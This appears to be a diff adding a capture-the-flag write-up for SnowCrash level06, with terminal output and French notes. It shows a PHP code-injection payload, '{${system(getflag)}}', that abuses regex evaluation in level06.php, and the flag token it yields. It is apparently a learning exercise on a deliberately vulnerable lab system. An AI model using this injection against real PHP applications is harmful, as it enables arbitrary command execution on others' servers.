@@ -1,0 +1,20 @@
+level06@SnowCrash:~$ ls
+level06  level06.php
+
+level06@SnowCrash:~$ ./level06
+PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
+
+level06.php
+
+level06@SnowCrash:~$ nano /tmp/ts
+[x {${system(getflag)}}]
+le patern [x ...]
+sachant que ... = /2 qui est pris dans "y(\"\\2\")"
+${} permettent de prioriser leurs interpretation
+car cela permet d'indiquer une variable en php1
+le fait de les doubler {${}} permet de ne pas creer d'erreur avec les ()
+cela permet d'executer en tant normal une fonction qui retourneras le nom de la variable
+level06@SnowCrash:~$ ./level06 /tmp/ts
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
